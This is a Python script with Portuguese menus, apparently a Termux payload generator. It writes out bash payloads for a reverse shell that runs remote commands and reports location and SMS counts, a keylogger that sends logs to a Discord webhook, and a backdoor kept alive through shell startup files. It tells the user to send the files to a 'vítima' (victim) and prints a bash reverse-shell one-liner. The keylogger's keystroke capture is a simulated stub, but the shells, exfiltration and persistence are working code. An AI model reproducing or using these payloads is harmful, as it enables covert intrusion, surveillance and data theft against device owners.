#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import time
import subprocess
import requests
import json
from pathlib import Path

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{Colors.CYAN}
 _____ _____ ____  __  __ _   ___  __     ____   _ __   ___     ___    _    ____  ____  
 |_   _| ____|  _ \|  \/  | | | \ \/ /    |  _ \ /    \ / / |   / _ \  / \  |  _ \/ ___| 
   | | |  _| | |_) | |\/| | | | |\  /_____| |_) / _    V /| |  | | | |/ _ \ | | | \___ \ 
   | | | |___|  _ <| |  | | |_| |/  \_____|  __/ ___ \| | | |__| |_| / ___ \| |_| |___) |
   |_| |_____|_| \_\_|  |_|\___//_/\_\    |_| /_/   \_\_| |_____\___/_/   \_\____/|____/ 
                                                                                         
    {Colors.END}""")

def menu():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ MENU PRINCIPAL ]{Colors.END}")
    print(f"{Colors.YELLOW}1.{Colors.END} Shell Reverso (Termux)")
    print(f"{Colors.YELLOW}2.{Colors.END} Keylogger com Discord Webhook")
    print(f"{Colors.YELLOW}3.{Colors.END} Backdoor com Persistência")
    print(f"{Colors.YELLOW}4.{Colors.END} Testar Conexão (Netcat)")
    print(f"{Colors.YELLOW}5.{Colors.END} Sair")
    
    while True:
        try:
            choice = input(f"\n{Colors.GREEN}[?]{Colors.END} Selecione uma opção (1-5): ")
            if choice in ['1', '2', '3', '4', '5']:
                return choice
            else:
                print(f"{Colors.RED}[!]{Colors.END} Opção inválida!")
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!]{Colors.END} Operação cancelada!")
            sys.exit(0)

def shell_reverso():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ SHELL REVERSO TERMUX ]{Colors.END}")
    print(f"{Colors.YELLOW}1.{Colors.END} Com Termux-API")
    print(f"{Colors.YELLOW}2.{Colors.END} Sem Termux-API")
    print(f"{Colors.YELLOW}3.{Colors.END} Voltar")
    
    choice = input(f"\n{Colors.GREEN}[?]{Colors.END} Selecione: ")
    
    if choice == '1':
        shell_com_api()
    elif choice == '2':
        shell_sem_api()
    elif choice == '3':
        return

def shell_com_api():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ SHELL REVERSO COM TERMUX-API ]{Colors.END}")
    
    ip = input(f"{Colors.GREEN}[?]{Colors.END} Seu IP: ")
    port = input(f"{Colors.GREEN}[?]{Colors.END} Porta: ")
    
    payload = f'''#!/bin/bash
# Shell Reverso com Termux-API
IP="{ip}"
PORT="{port}"

# Verificar se Termux-API está instalado
if ! pkg list-installed | grep -q "termux-api"; then
    echo "Instalando Termux-API..."
    pkg install -y termux-api
fi

# Função para obter informações do dispositivo
get_device_info() {{
    device_info=""
    [ -x "$(command -v termux-battery-status)" ] && device_info+="Battery: $(termux-battery-status | grep percentage | cut -d: -f2 | tr -d ' ,')% "
    [ -x "$(command -v termux-location)" ] && device_info+="Location: $(termux-location | grep -o '\"[^\"]*\"' | head -1) "
    [ -x "$(command -v termux-sms-list)" ] && device_info+="SMS: $(termux-sms-list | wc -l) msgs "
    echo "$device_info"
}}

while true; do
    if ! nc -z $IP $PORT 2>/dev/null; then
        echo "Tentando conectar em $IP:$PORT..."
        sleep 5
        continue
    fi
    
    exec 5<>/dev/tcp/$IP/$PORT
    if [ $? -eq 0 ]; then
        echo "Conexão estabelecida!"
        echo "Device Info: $(get_device_info)" >&5
        
        while read -r cmd 0<&5; do
            if [ "$cmd" = "exit" ]; then
                break
            elif [ "$cmd" = "get_info" ]; then
                get_device_info >&5
            else
                eval "$cmd" >&5 2>&1
            fi
            echo "END_CMD" >&5
        done
        
        exec 5<&-
        exec 5>&-
    fi
    sleep 10
done
'''
    
    filename = "shell_reverso_api.sh"
    with open(filename, 'w') as f:
        f.write(payload)
    
    print(f"\n{Colors.GREEN}[+]{Colors.END} Payload criado: {filename}")
    print(f"\n{Colors.BLUE}[i]{Colors.END} Instruções:")
    print("1. Envie o arquivo para a vítima")
    print("2. Execute na vítima: bash shell_reverso_api.sh")
    print("3. Inicie o listener: nc -lvnp " + port)
    print("4. Comandos especiais: 'get_info' para informações do dispositivo")

def shell_sem_api():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ SHELL REVERSO SEM TERMUX-API ]{Colors.END}")
    
    ip = input(f"{Colors.GREEN}[?]{Colors.END} Seu IP: ")
    port = input(f"{Colors.GREEN}[?]{Colors.END} Porta: ")
    
    payload = f'''#!/bin/bash
# Shell Reverso sem Termux-API
IP="{ip}"
PORT="{port}"

get_basic_info() {{
    echo "User: $(whoami)"
    echo "Hostname: $(hostname)"
    echo "OS: $(uname -a)"
    echo "Directory: $(pwd)"
}}

while true; do
    if nc -z $IP $PORT 2>/dev/null; then
        exec 5<>/dev/tcp/$IP/$PORT
        if [ $? -eq 0 ]; then
            echo "Conectado! Enviando informações..." >&5
            get_basic_info >&5
            
            while read -r cmd 0<&5; do
                if [ "$cmd" = "exit" ]; then
                    break
                fi
                eval "$cmd" >&5 2>&1
                echo "END_CMD" >&5
            done
            
            exec 5<&-
            exec 5>&-
        fi
    else
        echo "Aguardando conexão..."
        sleep 10
    fi
done
'''
    
    filename = "shell_reverso_basic.sh"
    with open(filename, 'w') as f:
        f.write(payload)
    
    print(f"\n{Colors.GREEN}[+]{Colors.END} Payload criado: {filename}")
    print(f"\n{Colors.BLUE}[i]{Colors.END} Instruções:")
    print("1. Envie o arquivo para a vítima")
    print("2. Execute na vítima: bash shell_reverso_basic.sh")
    print("3. Inicie o listener: nc -lvnp " + port)

def keylogger_discord():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ KEYLOGGER COM DISCORD ]{Colors.END}")
    
    webhook = input(f"{Colors.GREEN}[?]{Colors.END} Webhook do Discord: ")
    
    payload = f'''#!/bin/bash
# Keylogger para Termux com Discord Webhook
WEBHOOK="{webhook}"

# Instalar dependências se necessário
if ! command -v python3 &> /dev/null; then
    pkg install -y python
fi

# Script Python para keylogger
cat > termux_keylogger.py << 'EOF'
import time
import requests
import json
from threading import Timer
from androidhelper import Android

droid = Android()
webhook_url = "{webhook}"
log_buffer = ""
buffer_size = 0
max_buffer_size = 1000

def send_to_discord(message):
    data = {{
        "content": f"🔑 **Keylogger Report**\\\\n```\\\\n{{message}}\\\\n```",
        "username": "Termux Keylogger"
    }}
    try:
        requests.post(webhook_url, json=data, timeout=10)
    except:
        pass

def check_keys():
    global log_buffer, buffer_size
    
    # Simular captura de teclas (em ambiente real precisaria de root)
    current_time = time.strftime("%Y-%m-%d %H:%M:%S")
    sample_data = f"[{{current_time}}] Keystroke captured - Simulated data\\\\n"
    
    log_buffer += sample_data
    buffer_size += len(sample_data)
    
    if buffer_size >= max_buffer_size:
        send_to_discord(log_buffer)
        log_buffer = ""
        buffer_size = 0
    
    # Agendar próxima verificação
    Timer(30.0, check_keys).start()

def get_device_info():
    try:
        info = []
        info.append(f"Device: {{droid.getDevice().result}}")
        info.append(f"Model: {{droid.getModel().result}}")
        info.append(f"SDK: {{droid.getSdkVersion().result}}")
        return " | ".join(info)
    except:
        return "Device info unavailable"

# Enviar informações iniciais
initial_info = f"📱 Keylogger Ativado\\\\n💡 Device Info: {{get_device_info()}}"
send_to_discord(initial_info)

# Iniciar keylogger
print("Keylogger iniciado...")
check_keys()

# Manter script rodando
try:
    while True:
        time.sleep(60)
except KeyboardInterrupt:
    send_to_discord("🛑 Keylogger finalizado")
EOF

# Executar keylogger em background
python3 termux_keylogger.py &
echo "Keylogger iniciado em background. PID: $!"

# Persistência básica
echo "python3 termux_keylogger.py &" >> ~/.bashrc
echo "Persistência adicionada ao .bashrc"
'''
    
    filename = "keylogger_setup.sh"
    with open(filename, 'w') as f:
        f.write(payload)
    
    print(f"\n{Colors.GREEN}[+]{Colors.END} Keylogger criado: {filename}")
    print(f"\n{Colors.BLUE}[i]{Colors.END} Instruções:")
    print("1. Envie o arquivo para a vítima")
    print("2. Execute: bash keylogger_setup.sh")
    print("3. O keylogger iniciará automaticamente")
    print("4. Verifique o webhook do Discord para logs")

def backdoor_persistencia():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ BACKDOOR COM PERSISTÊNCIA ]{Colors.END}")
    
    ip = input(f"{Colors.GREEN}[?]{Colors.END} Seu IP: ")
    port = input(f"{Colors.GREEN}[?]{Colors.END} Porta: ")
    
    payload = f'''#!/bin/bash
# Backdoor Persistente para Termux
IP="{ip}"
PORT="{port}"

BACKDOOR_SCRIPT="/data/data/com.termux/files/usr/etc/profile.d/persist.sh"

# Criar script de backdoor
cat > $BACKDOOR_SCRIPT << EOF
#!/bin/bash
# Backdoor Persistente
sockexec() {{
    while true; do
        if nc -z $IP $PORT 2>/dev/null; then
            exec 5<>/dev/tcp/$IP/$PORT
            if [ \$? -eq 0 ]; then
                echo "Backdoor conectado \$(date)" >&5
                
                while read -r cmd 0<&5; do
                    if [ "\$cmd" = "cleanup" ]; then
                        rm -f $BACKDOOR_SCRIPT
                        sed -i '/persist.sh/d' ~/.bashrc
                        echo "Persistência removida" >&5
                        break
                    elif [ "\$cmd" = "exit" ]; then
                        break
                    else
                        eval "\$cmd" >&5 2>&1
                        echo "END_CMD" >&5
                    fi
                done
                
                exec 5<&-
                exec 5>&-
            fi
        fi
        sleep 30
    done
}}

# Executar em background
sockexec &
EOF

chmod +x $BACKDOOR_SCRIPT

# Adicionar persistência
echo "[ -x $BACKDOOR_SCRIPT ] && $BACKDOOR_SCRIPT &" >> ~/.bashrc
echo "[ -x $BACKDOOR_SCRIPT ] && $BACKDOOR_SCRIPT &" >> /data/data/com.termux/files/usr/etc/bash.bashrc

# Iniciar backdoor
$BACKDOOR_SCRIPT &

echo "Backdoor persistente instalado!"
echo "Arquivo: $BACKDOOR_SCRIPT"
echo "Persistência adicionada ao .bashrc e bash.bashrc"

# Comando para remover (enviar via socket: "cleanup")
echo "Para remover, conecte via socket e envie o comando: cleanup"
'''
    
    filename = "backdoor_persistent.sh"
    with open(filename, 'w') as f:
        f.write(payload)
    
    print(f"\n{Colors.GREEN}[+]{Colors.END} Backdoor criado: {filename}")
    print(f"\n{Colors.BLUE}[i]{Colors.END} Instruções:")
    print("1. Envie o arquivo para a vítima")
    print("2. Execute: bash backdoor_persistent.sh")
    print("3. O backdoor será executado automaticamente no boot")
    print("4. Comando 'cleanup' para remover persistência")

def testar_netcat():
    print(f"\n{Colors.BOLD}{Colors.WHITE}[ TESTAR CONEXÃO NETCAT ]{Colors.END}")
    
    print(f"\n{Colors.BLUE}[i]{Colors.END} Instruções para teste:")
    print("1. Em UM terminal, inicie o listener:")
    print("   nc -lvnp 4444")
    print("2. Em OUTRO terminal, conecte-se:")
    print("   nc [IP_VITIMA] 4444")
    print("3. Para testar shell reverso:")
    print("   - Listener: nc -lvnp 4444")
    print("   - Vítima: bash -i >& /dev/tcp/[SEU_IP]/4444 0>&1")
    
    input(f"\n{Colors.GREEN}[?]{Colors.END} Pressione Enter para continuar...")

def main():
    try:
        while True:
            banner()
            choice = menu()
            
            if choice == '1':
                shell_reverso()
            elif choice == '2':
                keylogger_discord()
            elif choice == '3':
                backdoor_persistencia()
            elif choice == '4':
                testar_netcat()
            elif choice == '5':
                print(f"\n{Colors.GREEN}[+]{Colors.END} Saindo...")
                break
            
            input(f"\n{Colors.GREEN}[?]{Colors.END} Pressione Enter para continuar...")
    
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!]{Colors.END} Programa interrompido!")
        sys.exit(0)

if __name__ == "__main__":
    # Verificar se está no Termux
    if not os.path.exists('/data/data/com.termux/files/home'):
        print(f"{Colors.RED}[!]{Colors.END} Este script é otimizado para Termux!")
        print("Executar em outros ambientes pode não funcionar corretamente.")
        
        continuar = input("Continuar mesmo assim? (s/N): ")
        if continuar.lower() != 's':
            sys.exit(1)
    
    main()
